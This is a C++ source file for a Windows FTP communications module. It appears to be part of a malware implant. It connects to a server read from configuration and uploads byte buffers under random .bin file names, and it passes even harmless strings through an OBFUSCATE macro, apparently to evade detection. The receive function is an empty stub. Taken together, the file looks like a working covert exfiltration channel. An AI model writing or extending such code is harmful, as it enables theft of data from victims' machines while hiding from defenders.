// src/communication/FtpComms.cpp
#include "communication/FtpComms.h"
#include "core/Logger.h"
#include "core/Configuration.h"
#include "security/Obfuscation.h"
#include "utils/StringUtils.h"
#include <wininet.h>
#include <vector>
#include <cstdint>
#include <string>

#pragma comment(lib, "wininet.lib")

// Obfuscated strings
static const auto OBF_FTP_COMMS = OBFUSCATE("FtpComms");

FtpComms::FtpComms(Configuration* config)
    : m_config(config), m_hInternet(NULL), m_hConnect(NULL) {}

FtpComms::~FtpComms() {
    Cleanup();
}

bool FtpComms::Initialize() {
    // Initialize WinINet session
    m_hInternet = InternetOpenA(
        OBFUSCATE("FTP Client/1.0"),
        INTERNET_OPEN_TYPE_DIRECT,
        NULL,
        NULL,
        0
    );

    if (!m_hInternet) {
        LOG_ERROR("Failed to initialize WinINet session: " + std::to_string(GetLastError()));
        return false;
    }

    // Parse FTP URL
    std::string url = m_config->GetServerUrl();
    URL_COMPONENTSA urlComp;
    ZeroMemory(&urlComp, sizeof(urlComp));
    urlComp.dwStructSize = sizeof(urlComp);
    urlComp.dwSchemeLength = (DWORD)-1;
    urlComp.dwHostNameLength = (DWORD)-1;
    urlComp.dwUrlPathLength = (DWORD)-1;
    urlComp.dwUserNameLength = (DWORD)-1;
    urlComp.dwPasswordLength = (DWORD)-1;

    if (!InternetCrackUrlA(url.c_str(), static_cast<DWORD>(url.length()), 0, &urlComp)) {
        LOG_ERROR("Failed to parse FTP URL: " + std::to_string(GetLastError()));
        return false;
    }

    std::string hostName(urlComp.lpszHostName, urlComp.dwHostNameLength);
    std::string userName, password, path;
    
    if (urlComp.lpszUserName && urlComp.dwUserNameLength > 0) {
        userName = std::string(urlComp.lpszUserName, urlComp.dwUserNameLength);
    }
    
    if (urlComp.lpszPassword && urlComp.dwPasswordLength > 0) {
        password = std::string(urlComp.lpszPassword, urlComp.dwPasswordLength);
    }
    
    if (urlComp.lpszUrlPath && urlComp.dwUrlPathLength > 0) {
        path = std::string(urlComp.lpszUrlPath, urlComp.dwUrlPathLength);
    }

    // Establish FTP connection
    m_hConnect = InternetConnectA(
        m_hInternet,
        hostName.c_str(),
        urlComp.nPort,
        userName.empty() ? NULL : userName.c_str(),
        password.empty() ? NULL : password.c_str(),
        INTERNET_SERVICE_FTP,
        INTERNET_FLAG_PASSIVE,
        0
    );

    if (!m_hConnect) {
        LOG_ERROR("Failed to establish FTP connection: " + std::to_string(GetLastError()));
        return false;
    }

    LOG_INFO("FTP communication initialized successfully");
    return true;
}

bool FtpComms::SendData(const std::vector<uint8_t>& data) {
    if (!m_hConnect) {
        LOG_ERROR("FTP connection not initialized");
        return false;
    }

    // Generate unique filename
    std::string fileName = utils::StringUtils::GenerateRandomString(12) + ".bin";
    
    // Store file on FTP server
    HINTERNET hFile = FtpOpenFileA(
        m_hConnect,
        fileName.c_str(),
        GENERIC_WRITE,
        FTP_TRANSFER_TYPE_BINARY,
        0
    );

    if (!hFile) {
        LOG_ERROR("Failed to open FTP file: " + std::to_string(GetLastError()));
        return false;
    }

    // Write data to file
    DWORD bytesWritten;
    if (!InternetWriteFile(
        hFile,
        data.data(),
        static_cast<DWORD>(data.size()),
        &bytesWritten
    )) {
        LOG_ERROR("Failed to write FTP file: " + std::to_string(GetLastError()));
        InternetCloseHandle(hFile);
        return false;
    }

    if (bytesWritten != data.size()) {
        LOG_ERROR("Incomplete FTP file write: " + std::to_string(bytesWritten) + 
                 "/" + std::to_string(data.size()));
        InternetCloseHandle(hFile);
        return false;
    }

    InternetCloseHandle(hFile);
    LOG_DEBUG("FTP file uploaded successfully: " + fileName);
    return true;
}

void FtpComms::Cleanup() {
    if (m_hConnect) {
        InternetCloseHandle(m_hConnect);
        m_hConnect = NULL;
    }
    if (m_hInternet) {
        InternetCloseHandle(m_hInternet);
        m_hInternet = NULL;
    }
    
    LOG_DEBUG("FTP communication cleaned up");
}

bool FtpComms::TestConnection() const {
    // Simple FTP connection test
    return InternetCheckConnectionA("ftp://google.com", FLAG_ICC_FORCE_CONNECTION, 0);
}

std::vector<uint8_t> FtpComms::ReceiveData() {
    // Implement FTP data reception if needed
    return std::vector<uint8_t>();
}